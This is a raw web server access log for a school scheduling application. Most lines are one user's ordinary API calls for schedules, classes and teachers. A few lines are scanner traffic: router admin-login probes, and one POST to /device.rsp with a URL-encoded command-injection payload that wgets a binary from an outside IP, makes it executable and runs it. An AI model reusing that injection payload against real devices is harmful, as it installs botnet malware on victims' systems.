118.70.191.159 - - [07/May/2025:19:09:42 +0000] "GET / HTTP/1.1" 504 569 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 4835 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/classes/user/thanhnpst1 HTTP/1.1" 200 774 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 736196 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:03 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 736196 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:11 +0000] "GET /manifest.json HTTP/1.1" 304 0 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:16 +0000] "GET /static/js/bundle.js.map HTTP/1.1" 200 1375853 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5779 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5779 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:18 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:19 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1105501 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:20:19 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1105501 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:09 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 513 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:09 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:09 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classes/user/thanhnpst1 HTTP/1.1" 200 781 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/classes/user/thanhnpst1 HTTP/1.1" 200 781 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:11 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:11 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:22:11 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
161.248.238.13 - - [08/May/2025:10:23:59 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
161.248.238.13 - - [08/May/2025:10:23:59 +0000] "" 400 0 "-" "-"
185.16.38.107 - - [08/May/2025:10:24:40 +0000] "GET / HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
161.248.238.13 - - [08/May/2025:10:28:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
161.248.238.13 - - [08/May/2025:10:28:37 +0000] "" 400 0 "-" "-"
118.70.191.166 - - [08/May/2025:10:28:59 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:28:59 +0000] "GET /static/js/bundle.js HTTP/1.1" 304 0 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:28:59 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 416 "http://fams.io.vn/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:28:59 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 200 416 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:00 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:00 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:02 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:04 +0000] "GET /manifest.json HTTP/1.1" 304 0 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:09 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:09 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:09 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:10 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:10 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:10 +0000] "GET /api-nodejs/teachers/search?search=&page=1&limit=100 HTTP/1.1" 200 4201 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:11 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:29:11 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1475153 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
193.34.212.110 - - [08/May/2025:10:29:25 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20llarm7%3B%20wget%20http%3A%2F%2F103.188.82.240%2Fllarm7%3B%20chmod%20777%20%2A%3B%20.%2Fllarm7%20xpl5 HTTP/1.1" 404 150 "-" "Mozila/5.0"
118.70.191.166 - - [08/May/2025:10:30:40 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:30:40 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:30:41 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.166 - - [08/May/2025:10:30:41 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5867 "http://fams.io.vn/Schedule" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
